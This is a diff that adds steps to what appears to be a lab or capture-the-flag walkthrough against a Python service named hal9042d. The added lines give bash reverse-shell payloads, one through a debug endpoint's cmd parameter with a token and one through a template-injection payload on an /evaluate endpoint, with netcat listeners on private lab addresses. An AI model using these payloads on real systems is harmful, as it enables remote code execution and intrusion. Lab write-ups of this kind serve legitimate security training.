@@ -70,7 +70,9 @@ ENV = "development"
 
 from that point we can use commands from a curl or directly from the url
 ```
-
+nc -lvnp 4444
+curl http://localhost:5042/api/debug
+ --data-urlencode "?cmd=bash -i >& /dev/tcp/192.168.56.1/4444 0>&1&token=h4l_d3bug_t0k3n_2024"
 ```
 
 ## Evaluate injection
@@ -90,7 +92,13 @@ window.HAL_DEBUG = {
     note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
 };
 ```
-
+we learned that the server is python so we can try to inject python code using this evaluate endpoint with those headers
+```
+nc -lvnp 4444
+curl -X POST http://192.168.56.102:5042/evaluate \
+  -H "X-Debug-Render: true" \
+  --data-urlencode "project_name={{ self.init.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"').read() }}"
+```
 we can get further information from /api/internal/schema
 ```
 {"host":"127.0.0.1","note":"debug command handler still enabled \u2014 paco","port":7042,"render_debug_header":"X-Debug-Render","service":"hal9042d","transport":"tcp"}
